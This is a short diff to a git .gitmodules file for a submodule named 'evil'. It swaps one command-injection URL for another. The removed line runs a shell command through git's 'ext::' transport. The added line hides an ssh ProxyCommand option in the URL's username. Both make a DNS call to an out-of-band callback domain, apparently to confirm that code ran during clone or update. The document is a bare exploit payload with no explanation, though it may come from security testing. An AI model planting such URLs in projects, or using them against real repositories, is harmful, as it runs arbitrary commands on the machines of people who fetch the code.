@@ -1,3 +1,3 @@
 [submodule "evil"]
     path = vendor/evil
-    url = ext::sh -c "getent hosts grvw-saiqvbbo9bg--gssubext.oob.an1me.sh; exit 1"
+    url = ssh://-oProxyCommand%3Dgetent%20hosts%20grvw-saiqvbbo9bg--gssubssh.oob.an1me.sh@127.0.0.1/repo.git
